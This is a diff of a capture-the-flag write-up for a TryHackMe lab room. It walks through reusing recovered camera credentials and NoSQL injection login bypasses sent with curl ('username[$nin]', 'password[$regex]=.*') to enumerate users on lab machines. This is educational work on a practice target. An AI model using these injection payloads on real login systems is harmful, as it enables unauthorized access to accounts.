@@ -222,10 +222,13 @@ ROW=0
 
 ```
 
-With this username / password combination in hand we can now head abck to the browser and log in to the camera's web interface, where we are greeted by the first flag for this challenge.
+With this username / password combination in hand we can now head back to the browser and log in to the camera's web interface, where we are greeted by the first flag for this challenge.
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/b9060a2e-bc9a-4221-be0a-fef6d4a222e7)
 
+
+
+Now that we are on the inside of the work (running off the IP Camera's firmware), it's worth trying to see whether the **"internal-only web application"** is now accessible to us:
 ```
 $ curl http://10.10.188.58:8080
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -234,7 +237,7 @@ $ curl http://10.10.188.58:8080
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>401 Unauthorized</title>
-</head><body>
+</head><body>curl
 <h1>Unauthorized</h1>
 <p>This server could not verify that you
 are authorized to access the document
@@ -245,8 +248,9 @@ the credentials required.</p>
 <hr>
 <address>Apache/2.4.57 (Debian) Server at 10.10.188.58 Port 8080</address>
 </body></html>
+```
 
-
+We are served a page saying that the server is expecting us to supply credentials to access it, so perhaps we can try passing the credentials we just retrieved for the camera dashboard:
 ```
 curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.188.58:8080/
 <br />
@@ -262,13 +266,9 @@ curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.188.58:8080/
   <link rel="stylesheet" href="styles.css" />
 </head>
 ```
-
+This still throws up an error, but if we add the `-L` switch to `curl` it wll follow website redirects and this time we get a different result:
 ```
-$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.61.217:8080/login.php -X POST -d 'username=admin&password=Y3tiStarCur!ouspassword=admin' -c cookie.txt -L
-```
-
-```
-curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username=admin&password=Y3tiStarCur!ouspassword=admin' -c cookie.txt -L
+$ curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080 -L
 
 <!DOCTYPE html>
 <html lang="en" class="h-full bg-thm-900">
@@ -280,7 +280,48 @@ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.
   <title>TryHackMe</title>
   <link rel="stylesheet" href="styles.css" />
 </head>
+...
+...
+<div class="mt-10 sm:mx-auto sm:w-full sm:max-w-[480px]">
+      <div class="bg-thm-600 px-6 py-12 shadow-lg shadow-black/40 sm:rounded-lg sm:px-12">
+        <form class="space-y-6" action="#" method="POST">
+          <div>
+            <label for="username" class="block text-sm font-medium leading-6 text-gray-100">Username</label>
+            <div class="mt-2">
+              <input id="username" name="username" type="text" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focuxt-sm font-medium leading-6 text-gray-100">Password</label>
+            <div class="mt-2">
+              <input id="password" name="password" type="password" autocomplete="current-password" required class="block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-thm-600 sm:text-sm sm:leading-6">
+            </div>
+          </div>
+
+          <div>
+            <button type="submit" class="flex w-full justify-center rounded-md bg-green-500 px-3 py-1.5 text-sm font-semibold leading-6 uppercase text-thm-800 shadow-sm hover:bg-green-400 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-green-600">Sign in</button>
+          </div>
+        </form>
+
+        <!-- Error message -->
+              </div>
+...
+...
+...
 ```
+
+From this output we can tell that the site is expecting us to pass a username and password and just by trying the most common page name and entering `curl http://10.10.61.217:8080/login.php` we are served with the exact page, so we now know where we were being redirected too and which page is expecting us to pass it a username and password 
+
+Let's try and re-write our `curl` command to pass on our username and password to `login.php`.  We also add a `-c` switch to save any cookies served by the page:
+
+```
+$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.61.217:8080/login.php -X POST -d 'username=admin&password=Y3tiStarCur!ouspassword=admin' -c cookie -L
+```
+This time we get a response telling us that the username or password are incorrect:
+```
+        <!-- Error message -->
+                  <p class="py-4 mt-3 text-center bg-thm-900 text-sm text-red-500 border rounded-md border-red-500">
+            Invalid username or password          </p>
+              </div>
+```
+
+
 
 
 ```
@@ -289,17 +330,56 @@ $
 <!DOCTYPE html>
 <html lang="en" class="h-full bg-thm-800">
 
-<head>
-  <meta charset="UTF-8" />
-  <link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>TryHackMe | Cyber Police Dashboard</title>
-  <link rel="stylesheet" href="styles.css" />
-</head>
+...
+
+    </div>
+      </div>
+    </nav>
+
+    <div class="">
+      <header>
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 bg-thm-800">
+          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frostbite!</h1>
+                  </div>
+      </header>
+
+...
+```
+```
+curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.1.6:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
+```
+**Welcome `Snowballer`**
+
+```
+curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
+
+          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
+Size: 13899
+```
+```
+Frostbite
+Snowballer
+Slushinski
+Blizzardson
+Tinseltooth
+Snowbacca
+Grinchowski
+Scroogestein
+Sleighburn
+Northpolinsky
+Frostington
+Tinselova
+Frostova
+Iciclevich
+Frostopoulos
+Grinchenko
+Snownandez
+Frosteau
 ```
 
+![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/4cdaa093-1b60-4fc3-a61d-63c7f4121f08)
 
-```
+
 $ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username=Frosteau&password[$regex]=.*' -c cookie.txt -L
 $ 
 <!DOCTYPE html>
